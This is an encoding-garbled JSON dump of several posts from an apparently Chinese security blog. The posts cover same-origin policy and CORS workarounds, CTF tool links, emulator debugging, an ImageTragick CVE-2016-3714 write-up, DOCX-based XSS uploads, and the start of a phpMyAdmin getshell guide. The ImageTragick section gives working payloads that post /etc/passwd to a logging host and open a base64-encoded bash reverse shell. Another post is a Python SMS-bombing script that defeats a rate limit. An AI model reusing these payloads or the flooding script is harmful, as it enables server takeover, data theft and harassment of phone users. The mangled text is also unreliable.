æ³•é€šè¿‡è¿™ç§æ–¹æ³•ï¼Œè§„é¿åŒæºæ”¿ç­–ï¼Œè€Œè¦ä½¿ç”¨ä¸‹æ–‡ä»‹ç»çš„PostMessage APIã€‚ å¦å¤–ï¼ŒæœåŠ¡å™¨ä¹Ÿå¯ä»¥åœ¨è®¾ç½®Cookieçš„æ—¶å€™ï¼ŒæŒ‡å®šCookieçš„æ‰€å±åŸŸåä¸ºä¸€çº§åŸŸåï¼Œæ¯”å¦‚.example.comã€‚ Set-Cookie: key=value; domain=.example.com; path=/ è¿™æ ·çš„è¯ï¼ŒäºŒçº§åŸŸåå’Œä¸‰çº§åŸŸåä¸ç”¨åšä»»ä½•è®¾ç½®ï¼Œéƒ½å¯ä»¥è¯»å–è¿™ä¸ªCookieã€‚ æ‰€ä»¥Cookieä¸­çš„åŒæºåªå…³æ³¨åŸŸåï¼Œå¿½ç•¥åè®®å’Œç«¯å£ã€‚æ‰€ä»¥https://localhost:8080/å’Œhttp://localhost:8081/çš„Cookieæ˜¯å…±äº«çš„ã€‚ LocalStorageã€IndexDBç­‰å­˜å‚¨æ€§å†…å®¹ DOMèŠ‚ç‚¹ 0x05 å…è®¸è·¨åŸŸåŠ è½½çš„ä¸‰ä¸ªæ ‡ç­¾123&lt;img src=&quot;&quot; /&gt;&lt;link href=&quot;&quot; /&gt;&lt;script src=&quot;&quot;&gt;&lt;/script&gt; scriptå¹¶æ— è·¨åŸŸé™åˆ¶, è¿™æ˜¯å› ä¸ºscriptæ ‡ç­¾å¼•å…¥çš„æ–‡ä»¶ä¸èƒ½å¤Ÿè¢«å®¢æˆ·ç«¯çš„ js è·å–åˆ°, ä¸ä¼šå½±å“åˆ°åŸé¡µé¢çš„å®‰å…¨, å› æ­¤scriptæ ‡ç­¾å¼•å…¥çš„æ–‡ä»¶æ²¡å¿…è¦éµå¾ªæµè§ˆå™¨çš„åŒæºç­–ç•¥. ç›¸å, ajax åŠ è½½çš„æ–‡ä»¶å†…å®¹å¯è¢«å®¢æˆ·ç«¯ js è·å–åˆ°, å¼•å…¥çš„æ–‡ä»¶å†…å®¹å¯èƒ½ä¼šæ³„æ¼æˆ–è€…å½±å“åŸé¡µé¢å®‰å…¨, æ•…, ajaxå¿…é¡»éµå¾ªåŒæºç­–ç•¥. 0x06 ç»•è¿‡è·¨åŸŸ SOP å¸¦æ¥å®‰å…¨ï¼ŒåŒæ—¶ä¹Ÿä¼šå¸¦æ¥ä¸€å®šç¨‹åº¦çš„éº»çƒ¦ï¼Œå› ä¸ºæœ‰æ—¶å€™å°±æ˜¯æœ‰è·¨åŸŸçš„éœ€æ±‚ã€‚ç»•è¿‡è·¨åŸŸçš„æ–¹æ¡ˆç”±äºç¯‡å¹…æ‰€é™ï¼Œå¹¶ä¸”ç½‘ä¸Šä¹Ÿå¾ˆå¤šç›¸å…³æ–‡ç« ï¼Œæ‰€ä»¥ä¸åœ¨è¿™é‡Œå±•å¼€è§£å†³è·¨åŸŸçš„æ–¹æ¡ˆï¼Œåªç»™å‡ºå‡ ä¸ªå…³é”®è¯ï¼š å¯¹äº ajax ä½¿ç”¨ JSONP jsonpæ˜¯å°†è¯·æ±‚é€šè¿‡åŠ¨æ€åˆ›å»ºä¸€ä¸ªâ€œscriptâ€æ ‡ç­¾çš„æ–¹å¼æ¥å°†è¯·æ±‚å‘é€å‡ºå»çš„ï¼Œæ‰€ä»¥ä¸æ˜¯XMLhttpRequestè¯·æ±‚ï¼Œæµè§ˆå™¨å°±ä¸ä¼šè¿›è¡Œæ‹¦æˆªæ ¡éªŒã€‚ AJAXçš„ä½¿ç”¨ä¸å¹³å¸¸æ— å¼‚ï¼Œåªéœ€è¦å°†dataTypeæ”¹ä¸ºjsonpå³å¯ 12345678910var result; $.ajax(&#123; url: &apos;http://restapi.amap.com/v3/direction/driving?origin=116.45925,39.910031&amp;destination=116.587922,40.081577&amp;output=json&amp;key=5f5b33e5a55685fac26237601cd58a49&apos;, dataType: &quot;jsonp&quot;, jsonp: &quot;callback&quot;, //ä¸æœåŠ¡ç«¯çº¦å®šçš„å‡½æ•°åcache:true, //æ˜¯å¦éœ€è¦ç¼“å­˜ï¼Œå¦‚æœè¿™é‡Œæ²¡æœ‰é…ç½®ç¼“å­˜ï¼Œé‚£ä¹ˆè¯·æ±‚çš„URLè¿˜ä¼šæœ‰ä¸€ä¸ªå‚æ•° success: function(json)&#123; result = json; &#125; &#125;); æœåŠ¡ç«¯æ¥æ”¶åˆ°ä»¥åï¼Œåªéœ€è¦æ‰‹åŠ¨åˆ¤æ–­ä¸€ä¸‹æœ‰æ— callbackå†æ‰‹åŠ¨æ‹¼ä¸€å¯¹æ‹¬å·å³å¯,è¿™é‡Œä»¥javaä¸ºä¾‹ 1234567891011@ResponseBody@RequestMapping(value=&quot;xxx&quot;)public String testJsonp(String callback) &#123; Student result = new Student(); //å“åº”ç»“æœä¹‹å‰ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºjsonpè¯·æ±‚ if (StringUtils.isNotBlank(callback)) &#123; //æŠŠç»“æœå°è£…æˆä¸€ä¸ªjsè¯­å¥å“åº” return callback + &quot;(&quot; + JsonUtils.objectToJson(result) + &quot;);&quot;; &#125; return JsonUtils.objectToJson(result);&#125; åç«¯è¿›è¡Œ CORS é…ç½® åç«¯åå‘ä»£ç† ä½¿ç”¨ä»£ç†æ–¹å¼è·¨åŸŸæ›´åŠ ç›´æ¥ï¼Œå› ä¸ºSOPçš„é™åˆ¶æ˜¯æµè§ˆå™¨å®ç°çš„ã€‚å¦‚æœè¯·æ±‚ä¸æ˜¯ä»æµè§ˆå™¨å‘èµ·çš„ï¼Œå°±ä¸å­˜åœ¨è·¨åŸŸé—®é¢˜äº†ã€‚ ä½¿ç”¨æœ¬æ–¹æ³•è·¨åŸŸæ­¥éª¤å¦‚ä¸‹ï¼š æŠŠè®¿é—®å…¶å®ƒåŸŸçš„è¯·æ±‚æ›¿æ¢ä¸ºæœ¬åŸŸçš„è¯·æ±‚ æœ¬åŸŸçš„è¯·æ±‚æ˜¯æœåŠ¡å™¨ç«¯çš„åŠ¨æ€è„šæœ¬è´Ÿè´£è½¬å‘å®é™…çš„è¯·æ±‚ é¦–å…ˆåœ¨ conf\\apiserver-reverse-proxy-conf\\bingli\\main.conf ï¼Œæ²¡æœ‰ç›¸å…³ç›®å½•å’Œæ–‡ä»¶å°±æ–°å»º 123456location ~* ^/uc/.*&#123; proxy_set_header Host $host; proxy_set_header X-Real-Ip $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://192.168.10.111:8080;&#125; ç„¶ååœ¨nginxä¸»é…ç½®æ–‡ä»¶æ·»åŠ åŠ ç²—å†…å®¹ï¼Œå³æŠŠä»£ç†æ–‡ä»¶åŠ è½½è¿›æ¥ 12345location / &#123; root html; index index.html index.htm; &#125;include apiserver-reverse-proxy-conf/bingli/main.conf; 123456é‡å¯nginxï¼Œä¹‹åajaxå‘è¯·æ±‚åˆ°http://localhost/uc/aahttp://localhost/uc/bb?token=xxxxéƒ½ä¼šè¢«è½¬å‘åˆ°http://192.168.10.111:8080/uc/aahttp://192.168.10.111:8080/uc/bb?token=xxxx å¯¹äº iframe ä½¿ç”¨ location.hash æˆ– window.name è¿›è¡Œä¿¡æ¯äº¤æµ ä½¿ç”¨ postMessage 0x07 sopæ— æ³•é˜²å¾¡csrf æˆ‘ä»¬é€šè¿‡åŸç†å°±å¯ä»¥å‘ç°ã€‚CSRFæ˜¯æŒ‡ A ç½‘ç«™æ­£å¸¸ç™»é™†åï¼Œcookie æ­£å¸¸ä¿å­˜ï¼Œç”¨æˆ·è®¿é—®æ”»å‡»è€…ç½‘ç«™ B ï¼Œé€šè¿‡æŸç§æ–¹å¼è°ƒç”¨ A ç½‘ç«™æ¥å£è¿›è¡Œæ“ä½œï¼ŒA çš„æ¥å£åœ¨è¯·æ±‚æ—¶ä¼šè‡ªåŠ¨å¸¦ä¸Š cookieï¼Œæ¥å®Œæˆæ”»å‡»ã€‚ SOP é¦–å…ˆå°±æ˜¯â€œç¦æ­¢è·¨åŸŸè¯·æ±‚â€ï¼Œè¿™æ ·æè¿°ä¹Ÿä¸æ˜¯å¾ˆåˆæ³•ã€‚æœ¬è´¨ä¸Š SOP å¹¶ä¸æ˜¯ç¦æ­¢è·¨åŸŸè¯·æ±‚ï¼Œè€Œæ˜¯åœ¨è¯·æ±‚åæ‹¦æˆªäº†è¯·æ±‚çš„å›åº”ã€‚ å‘ç°ï¼ŒSOP ä¸é˜»æ­¢æ¥å£è¯·æ±‚è€Œæ˜¯æ‹¦æˆªè¯·æ±‚ç»“æœã€‚ è€ŒCSRF æ°æ°å äº†è¿™ä¸¤ä¸ªä¾¿å®œï¼Œæ‰€ä»¥ SOP ä¸èƒ½ä½œä¸ºé˜²èŒƒ CSRF çš„æ–¹æ³•ã€‚ 0x08 SOP ä¸ ajax å¯¹äº ajax è¯·æ±‚ï¼Œåœ¨è·å¾—æ•°æ®ä¹‹åä½ èƒ½è‚†æ„è¿›è¡Œ js æ“ä½œã€‚è¿™æ—¶å€™è™½ç„¶åŒæºç­–ç•¥ä¼šé˜»æ­¢å“åº”ï¼Œä½†ä¾ç„¶ä¼šå‘å‡ºè¯·æ±‚ã€‚å› ä¸ºæ‰§è¡Œå“åº”æ‹¦æˆªçš„æ˜¯æµè§ˆå™¨è€Œä¸æ˜¯åç«¯ç¨‹åºã€‚äº‹å®ä¸Šä½ çš„è¯·æ±‚å·²ç»å‘åˆ°æœåŠ¡å™¨å¹¶è¿”å›äº†ç»“æœï¼Œä½†æ˜¯è¿«äºå®‰å…¨ç­–ç•¥ï¼Œæµè§ˆå™¨ä¸å…è®¸ä½ ç»§ç»­è¿›è¡Œ js æ“ä½œï¼Œæ‰€ä»¥æŠ¥å‡ºä½ ç†Ÿæ‚‰çš„ blocked by CORS policy: No â€˜Access-Control-Allow-Originâ€™ header is present on the requested resource.ã€‚ æ‰€ä»¥å†å¼ºè°ƒä¸€æ¬¡ï¼ŒåŒæºç­–ç•¥ä¸èƒ½ä½œä¸ºé˜²èŒƒ CSRF çš„æ–¹æ³•ã€‚ è·¨åŸŸæ˜¯æµè§ˆå™¨é™åˆ¶","categories":[{"name":"å‰ç«¯å®‰å…¨","slug":"å‰ç«¯å®‰å…¨","permalink":"http://www.vkxss.top/categories/å‰ç«¯å®‰å…¨/"}],"tags":[{"name":"å‰ç«¯çŸ¥è¯†","slug":"å‰ç«¯çŸ¥è¯†","permalink":"http://www.vkxss.top/tags/å‰ç«¯çŸ¥è¯†/"}]},{"title":"CTFä¸­å¸¸è§çš„åŠ è§£å¯†é›†åˆ","slug":"CTF-å¸¸è§çš„åŠ è§£å¯†é›†åˆ","date":"2019-01-07T20:25:40.000Z","updated":"2019-09-25T08:48:06.828Z","comments":true,"path":"2019/01/08/CTF-å¸¸è§çš„åŠ è§£å¯†é›†åˆ/","link":"","permalink":"http://www.vkxss.top/2019/01/08/CTF-å¸¸è§çš„åŠ è§£å¯†é›†åˆ/","excerpt":"","text":"CTFä¸­å¸¸è§çš„åŠ è§£å¯†é›†åˆ CTFï¼ˆCapture The Flagï¼‰ä¸­æ–‡ä¸€èˆ¬è¯‘ä½œå¤ºæ——èµ›ï¼Œåœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸä¸­æŒ‡çš„æ˜¯ç½‘ç»œå®‰å…¨æŠ€æœ¯äººå‘˜ä¹‹é—´è¿›è¡ŒæŠ€æœ¯ç«æŠ€çš„ä¸€ç§æ¯”èµ›å½¢å¼ã€‚CTFèµ·æºäº1996å¹´DEFCONå…¨çƒé»‘å®¢å¤§ä¼šï¼Œä»¥ä»£æ›¿ä¹‹å‰é»‘å®¢ä»¬é€šè¿‡äº’ç›¸å‘èµ·çœŸå®æ”»å‡»è¿›è¡ŒæŠ€æœ¯æ¯”æ‹¼çš„æ–¹å¼ã€‚å‘å±•è‡³ä»Šï¼Œå·²ç»æˆä¸ºå…¨çƒèŒƒå›´ç½‘ç»œå®‰å…¨åœˆæµè¡Œçš„ç«èµ›å½¢å¼ï¼Œ2013å¹´å…¨çƒä¸¾åŠäº†è¶…è¿‡äº”ååœºå›½é™…æ€§CTFèµ›äº‹ã€‚è€ŒDEFCONä½œä¸ºCTFèµ›åˆ¶çš„å‘æºåœ°ï¼ŒDEFCON CTFä¹Ÿæˆä¸ºäº†ç›®å‰å…¨çƒæœ€é«˜æŠ€æœ¯æ°´å¹³å’Œå½±å“åŠ›çš„CTFç«èµ›ï¼Œç±»ä¼¼äºCTFèµ›åœºä¸­çš„â€œä¸–ç•Œæ¯â€ ä»Šå¤©æˆ‘ä»¬æ¥èŠèŠCTFä¸­æ‚é¡¹é‡åˆ°è¿‡çš„å¸¸è§çš„åŠ è§£å¯†å§ï¼ è½¬è½½-åŸæ–‡é“¾æ¥ æ•´ç†äº†å‡ ä¸ªå…è´¹çš„è§£å¯†ç½‘ç«™ï¼ˆé•¿æŒ‰è·³è½¬ï¼‰ http://ctf.ssleye.com/ https://www.qqxiuzi.cn/ https://www.ctftools.com/down/ https://tool.bugku.com/?wafcloud=1 http://www.nicetool.net","categories":[{"name":"CTF","slug":"CTF","permalink":"http://www.vkxss.top/categories/CTF/"}],"tags":[{"name":"åŠ è§£å¯†é›†åˆ","slug":"åŠ è§£å¯†é›†åˆ","permalink":"http://www.vkxss.top/tags/åŠ è§£å¯†é›†åˆ/"}]},{"title":"Macä¸‹ä½¿ç”¨å¤œç¥æ¨¡æ‹Ÿå™¨è°ƒè¯•","slug":"APP-Macä¸‹ä½¿ç”¨å¤œç¥æ¨¡æ‹Ÿå™¨è°ƒè¯•","date":"2018-12-18T20:25:40.000Z","updated":"2019-09-20T02:01:52.896Z","comments":true,"path":"2018/12/19/APP-Macä¸‹ä½¿ç”¨å¤œç¥æ¨¡æ‹Ÿå™¨è°ƒè¯•/","link":"","permalink":"http://www.vkxss.top/2018/12/19/APP-Macä¸‹ä½¿ç”¨å¤œç¥æ¨¡æ‹Ÿå™¨è°ƒè¯•/","excerpt":"","text":"1ã€é‡åˆ°çš„é—®é¢˜ï¼š 1.1ã€æè¿°ï¼š 1.2ã€è§£å†³ï¼š 1ã€é‡åˆ°çš„é—®é¢˜ï¼š1.1ã€æè¿°ï¼š é¦–å…ˆå»å¤œç¥å®˜ç½‘ä¸‹è½½macç‰ˆæœ€æ–°appï¼Œåæ§½ä¸€ä¸‹ï¼Œå†…ç½®åº”ç”¨å¾ˆä¸çˆ½ï¼Œé‚£ä¹ˆMacä½¿ç”¨å¤œç¥æ¨¡æ‹Ÿå™¨è°ƒè¯•ï¼Œé‡åˆ°adbæ— æ³•è¿æ¥å¤œç¥æ¨¡æ‹Ÿå™¨ï¼Œæ€ä¹ˆåŠï¼Ÿ 1.2ã€è§£å†³ï¼š ä½¿ç”¨adb deviceså‘½ä»¤ä¼šå‘ç°ï¼Œæ²¡æœ‰æ­¤è®¾å¤‡ï¼Œæ·»åŠ è®¾å¤‡ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šæ–¹æ³•ï¼Œä¸»è¦æ˜¯å°†usbæ–‡ä»¶å·åŠ å…¥adb_usb.iniä¸­ï¼Œä¸èµ˜è¿°ã€‚å†æ¬¡è¿è¡Œadb devicesï¼Œå‘ç°è¿˜æ˜¯æ‰¾ä¸åˆ°è®¾å¤‡ï¼Œä½¿ç”¨äº†ä¸€ä¸ªå–å·§çš„åŠæ³•ï¼Œå¤œç¥æ¨¡æ‹Ÿå™¨çš„æœåŠ¡é»˜è®¤ç›‘å¬åœ¨62001ç«¯å£ï¼Œæ‰€ä»¥ä½¿ç”¨adb connect 127.0.0.1:62001 é€šè¿‡adb connectå‘½ä»¤åˆ©ç”¨TCP/IPåè®®æ¥è¿æ¥ã€‚ è¿›å…¥è®¾å¤‡","categories":[{"name":"APP","slug":"APP","permalink":"http://www.vkxss.top/categories/APP/"}],"tags":[{"name":"APPæ¸—é€æµ‹è¯•","slug":"APPæ¸—é€æµ‹è¯•","permalink":"http://www.vkxss.top/tags/APPæ¸—é€æµ‹è¯•/"}]},{"title":"Imagetragick å‘½ä»¤æ‰§è¡Œæ¼æ´","slug":"CVE-2016â€“3714","date":"2018-10-12T07:30:08.000Z","updated":"2019-12-03T06:38:58.591Z","comments":true,"path":"2018/10/12/CVE-2016â€“3714/","link":"","permalink":"http://www.vkxss.top/2018/10/12/CVE-2016â€“3714/","excerpt":"","text":"æ¼æ´ç®€ä»‹ å½±å“ç‰ˆæœ¬ï¼š æ¼æ´æŒ–æ˜ åˆ©ç”¨æ–¹å¼ï¼š Reference æ¼æ´ç®€ä»‹ Imagetragick å‘½ä»¤æ‰§è¡Œæ¼æ´åœ¨16å¹´çˆ†å‡ºæ¥ä»¥åï¼Œwooyunä¸Šé¢ä¹Ÿçˆ†å‡ºäº†æ•°ä¸ªè¢«è¯¥æ¼æ´å½±å“çš„å¤§å‚å•†ï¼Œåƒè…¾è®¯ï¼Œ æ–°æµªï¼Œæ…•è¯¾â€¦.å½±å“å·¨å¤§ï¼Œè¿™é‡Œè´´å‡ºwooyunä¸Šå…³äºæ­¤æ¼æ´çš„æ¡ˆä¾‹ï¼šhttp://wooyun.org/bugs/wooyun-2016-0205125 ImageMagickæ˜¯ä¸€æ¬¾ä½¿ç”¨é‡å¾ˆå¹¿çš„å›¾ç‰‡å¤„ç†ç¨‹åºï¼Œå¾ˆå¤šå‚å•†éƒ½è°ƒç”¨äº†è¿™ä¸ªç¨‹åºè¿›è¡Œå›¾ç‰‡å¤„ç†ï¼ŒåŒ…æ‹¬å›¾ç‰‡çš„ä¼¸ç¼©ã€åˆ‡å‰²ã€æ°´å°ã€æ ¼å¼è½¬æ¢ç­‰ç­‰ã€‚ ä½†æœ‰ç ”ç©¶è€…å‘ç°ï¼Œå½“ç”¨æˆ·ä¼ å…¥ä¸€ä¸ªåŒ…å«ã€ç•¸å½¢å†…å®¹ã€çš„å›¾ç‰‡çš„æ—¶å€™ï¼Œå°±æœ‰å¯èƒ½è§¦å‘å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚ å›½å¤–çš„å®‰å…¨äººå‘˜ä¸ºæ­¤æ–°å»ºäº†ä¸€ä¸ªç½‘ç«™ï¼š https://imagetragick.com/ ä¸è¿™ä¸ªæ¼æ´ç›¸å…³çš„CVEæœ‰CVE-2016-3714ã€CVE-2016-3715ã€CVE-2016-3716ã€CVE-2016-3717ï¼Œ å…¶ä¸­æœ€ä¸¥é‡çš„å°±æ˜¯CVE-2016-3714ï¼Œåˆ©ç”¨è¿™ä¸ªæ¼æ´å¯ä»¥é€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„å±å®³ã€‚ å½±å“ç‰ˆæœ¬ï¼š ImageMagick 6.5.7-8 2012-08-17(æ‰‹å·¥æµ‹è¯•é£é™©å­˜åœ¨) ImageMagick 6.7.7-10 2014-03-06(æ‰‹å·¥æµ‹è¯•é£é™©å­˜åœ¨) ä½ç‰ˆæœ¬è‡³6.9.3-9 released 2016-04-30 æ¼æ´æŒ–æ˜ ä¸Šä¼ å¤´åƒ ä¸Šä¼ ç…§ç‰‡ æ’å…¥å›¾ç‰‡ ç­‰ç­‰ åˆ©ç”¨æ–¹å¼ï¼š Pocä»£ç ï¼š 1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://&quot;| curl dnslog&quot;)&apos;pop graphic-context æ‰§è¡Œå‘½ä»¤ï¼Œæ„é€ POCï¼š è¯»å–/etc/passwd 1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://&quot;| wget --post-file /etc/passwd dnslog&quot;)&apos;pop graphic-context æ‰§è¡Œå‘½ä»¤ï¼Œæ„é€ POCï¼š å¦‚æœæ¥æ”¶åˆ°httpè¯·æ±‚ï¼Œè¯´æ˜curlå‘½ä»¤æ‰§è¡ŒæˆåŠŸã€‚ 1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://127.0.0.0/joker.jpg&quot;|curl &quot;192.168.0.132:4444)&apos;pop graphic-context æ„é€ åå¼¹shellï¼ŒPOCï¼š è¿™é‡Œçš„ /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.132/4444 0&gt;&amp;1 éœ€è¦ç”¨base64åŠ å¯† 1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://127.0.0.0/bmjoker.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMC4xMzIvNDQ0NCAwPiYx | base64 -d | bash`&quot;||id &quot; )&apos;pop graphic-context Reference https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html https://www.anquanke.com/post/id/83871 https://wooyun.x10sec.org/static/bugs/wooyun-2016-0214787.html https://wooyun.x10sec.org/static/bugs/wooyun-2016-0205530.html","categories":[{"name":"CVE-2016","slug":"CVE-2016","permalink":"http://www.vkxss.top/categories/CVE-2016/"}],"tags":[{"name":"CVE-2016â€“3714","slug":"CVE-2016â€“3714","permalink":"http://www.vkxss.top/tags/CVE-2016â€“3714/"}]},{"title":"ç»•è¿‡ä¸€åˆ†é’Ÿé™åˆ¶çŸ­ä¿¡è½°ç‚¸","slug":"Python-çŸ­ä¿¡è½°ç‚¸è„šæœ¬","date":"2018-10-12T04:25:40.000Z","updated":"2019-11-20T05:09:48.519Z","comments":true,"path":"2018/10/12/Python-çŸ­ä¿¡è½°ç‚¸è„šæœ¬/","link":"","permalink":"http://www.vkxss.top/2018/10/12/Python-çŸ­ä¿¡è½°ç‚¸è„šæœ¬/","excerpt":"","text":"ä¸€åˆ†é’ŸçŸ­ä¿¡è½°ç‚¸è„šæœ¬ ä¸€åˆ†é’ŸçŸ­ä¿¡è½°ç‚¸è„šæœ¬ å½“å‰åç«¯æ ¡éªŒ60ç§’å€’è®¡æ—¶æ—¶ï¼Œä½¿ç”¨è¯¥è„šæœ¬è¿›è¡ŒçŸ­ä¿¡è½°ç‚¸ 12345678910111213141516171819202122232425262728293031323334#coding=utf-8# python 3.6.0import requestsimport randomimport time import jsonheaders=&#123; &quot;Host&quot;: &quot;qq.com&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0&quot;, &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Referer&quot;: &quot;https://qq.com/mng/&quot;, &quot;Cookie&quot;: &quot;XXX&quot;, &#125;def Send(): try: url = &quot;https://qq.com/&quot; data = &#123;&quot;phone&quot;:&quot;number&quot;,&quot;_qq_csrf&quot;:&quot;5d184ad253da6af72fec3106bfe3e8f79fa5a502&quot;&#125; # dataä¸ºjsonæ•°æ® # res = requests.post(url=url,headers=headers,data=json.dumps(data)) res = requests.post(url=url,headers=headers,data=data) print (&apos;Phone:number&apos; + &apos;ReturnValue:&#123;&#125;&apos;.format(res.text)) except Exception as e: print(e)if __name__==&quot;__main__&quot;: for i in range(30): time.sleep(65) Send()","categories":[{"name":"Python","slug":"Python","permalink":"http://www.vkxss.top/categories/Python/"}],"tags":[{"name":"WEBæ¸—é€æµ‹è¯•","slug":"WEBæ¸—é€æµ‹è¯•","permalink":"http://www.vkxss.top/tags/WEBæ¸—é€æµ‹è¯•/"}]},{"title":"DOCXæ–‡ä»¶å¼¹å‡ºXSS","slug":"æ¸—é€æµ‹è¯•-DOCXæ–‡ä»¶å¼¹å‡ºXSS","date":"2018-07-28T07:30:08.000Z","updated":"2019-09-22T17:11:51.250Z","comments":true,"path":"2018/07/28/æ¸—é€æµ‹è¯•-DOCXæ–‡ä»¶å¼¹å‡ºXSS/","link":"","permalink":"http://www.vkxss.top/2018/07/28/æ¸—é€æµ‹è¯•-DOCXæ–‡ä»¶å¼¹å‡ºXSS/","excerpt":"","text":"èƒŒæ™¯ï¼š å¦‚ä½•ä½¿ç”¨Microsoft Wordæ–‡æ¡£ï¼ˆdocxæ ¼å¼ï¼‰å°†è·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰æ¼æ´ä¸Šä¼ åˆ°WebæœåŠ¡å™¨ æ”¯æŒåœ¨çº¿è¯»å–wordæ–‡æ¡£ æˆ–è€…å…è®¸ä¸Šä¼ htmlæ–‡ä»¶ï¼Œæµè§ˆå™¨å¹¶æˆåŠŸè§£æ(Content-Typeä¸ºtext/html) æ„é€ XSSå¼¹æ¡†word æ–¹å¼ä¸€ï¼š Microsoft Wordæ–‡æ¡£çš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªåŒ…å«XMLå’ŒWordæ–‡ä»¶; æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿è¡ŒLinuxå‘½ä»¤strings file-sample.docxæ¥æŸ¥çœ‹æ–‡ä»¶ä¸­æ‰€æœ‰çš„ASCIIå­—ç¬¦ï¼Œä»¥æŸ¥çœ‹å¯ç”¨çš„å­—ç¬¦ä¸²; å°†æ–‡ä»¶è§£å‹ç¼©ï¼Œæ–¹ä¾¿æˆ‘ä»¬åœ¨ä¸æŸåæ–‡ä»¶çš„æƒ…å†µä¸‹ï¼Œä¿®æ”¹å®ƒï¼› ä¾‹å¦‚ä¿®æ”¹settings.xmlä¸ºaaaaaaaaa.xml; ç„¶åè¾“å…¥zip -r é‡æ–°æ‰“åŒ…ï¼Œç”Ÿæˆæ–°æ–‡ä»¶; åˆ©ç”¨ultraeditæ–‡æœ¬ç¼–è¾‘å™¨æŸ¥çœ‹åå…­è¿›åˆ¶ä»£ç å—æ‰¾åˆ°Açš„å­—ç¬¦ä¸²,å¹¶ä¿®æ”¹ä¸ºjsä»£ç ; 12345# strings file-sample.docx# unzip file-sample.docx# cd word# mv settings.xml aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.xml# zip -r test.docx * æ–¹å¼äºŒï¼š ç›´æ¥åˆ©ç”¨ultraeditæ–‡æœ¬ç¼–è¾‘å™¨æ‰¾åˆ°wordæ–‡æ¡£ç©ºç™½ä½ç½®,åœ¨ä¸ç ´åæ–‡æ¡£çš„æƒ…å†µä¸‹ï¼Œä¿®æ”¹ä¸ºJSä»£ç ä¿å­˜å³å¯; é˜²æŠ¤æªæ–½ è¿™æ ·çš„æ•ˆæœå¯¹äºå¼€å‘è€…æ¥è¯´åº”è¯¥é‡‡å–ä»¥ä¸‹æ‰‹æ®µæ¥è¿›è¡Œé™åˆ¶ã€‚ æ–‡ä»¶ä¸Šä¼ ä¹‹å‰ï¼Œåœ¨æœåŠ¡å™¨ç«¯éªŒè¯ä¸Šä¼ æ–‡ä»¶æ ¼å¼æ˜¯å¦ä¸º.docæˆ–.docxæœ‰æ•ˆæ ¼å¼ï¼› ä¸¥æ ¼é™åˆ¶Content-Typeå¤´ï¼Œå¯¹Content-Typeå¤´æˆ–ç‰¹å®šåç¼€æ ¼å¼æ›´æ”¹è¿‡çš„ä¸Šä¼ æ–‡ä»¶é¡»ä¿æŒä¸ä¸Šä¼ æ–‡ä»¶ç›¸åŒçš„Content-Typeå¤´ä¿¡æ¯ï¼› æ§åˆ¶æ–‡ä»¶ä¸‹è½½æ—¶çš„å…¶å®ƒæ“ä½œæƒ…å†µï¼Œæ·»åŠ å“åº”æ ‡å¤´:â€œContent-Disposition: attachmentâ€ï¼Œä»¥é˜²æ­¢åœ¨æµè§ˆå™¨ä¸­å†…åµŒæ˜¾ç¤ºæ–‡ä»¶ï¼› è¿‡æ»¤æ‰æ‰€æœ‰åŒ…å«HTMLæ ‡ç­¾çš„ä¸Šä¼ ï¼Œå› ä¸ºdocxå¯ç»å‹ç¼©ç¯¡æ”¹å…¶ä¸­åŒ…å«çš„HTMLæ–‡ä»¶ã€‚","categories":[{"name":"WEBå®‰å…¨","slug":"WEBå®‰å…¨","permalink":"http://www.vkxss.top/categories/WEBå®‰å…¨/"}],"tags":[{"name":"WEBæ¸—é€æµ‹è¯•","slug":"WEBæ¸—é€æµ‹è¯•","permalink":"http://www.vkxss.top/tags/WEBæ¸—é€æµ‹è¯•/"}]},{"title":"PhpMyadmin_Getshell","slug":"æ¸—é€æµ‹è¯•-PhpMyadmin_Getshell","date":"2018-06-17T07:30:08.000Z","updated":"2019-10-15T05:47:18.777Z","comments":true,"path":"2018/06/17/æ¸—é€æµ‹è¯•-PhpMyadmin_Getshell/","link":"","permalink":"http://www.vkxss.top/2018/06/17/æ¸—é€æµ‹è¯•-PhpMyadmin_Getshell/","excerpt":"","text":"phpmyadmin_getshell 0x01 into outfile 0x02 åˆ©ç”¨æ—¥å¿—getshell phpmyadmin_getshell å½“å‘ç°å­˜æœ‰phpmyadminç›®å½•æ—¶ï¼Œè¿›è€Œé€šè¿‡å¼±å£ä»¤æˆ–è€…æš´åŠ›ç ´è§£è¿›å…¥æ•°æ®åº“ä¹‹åï¼Œå¦‚ä½•getshell? å†™å…¥WebShellä¸»è¦æ¡ä»¶ï¼š Rootæ•°æ®åº“ç”¨æˆ·ï¼ˆrootæƒé™ï¼‰ ç½‘ç«™ç»å¯¹è·¯å¾„ï¼ˆç¡®å®šæœ‰å†™å…¥æƒé™ï¼‰ magic_quotes_gpcï¼šOffï¼ˆå…³é—­ï¼‰ å†™å…¥WebShellå…¶å®ƒæ¡ä»¶ï¼š 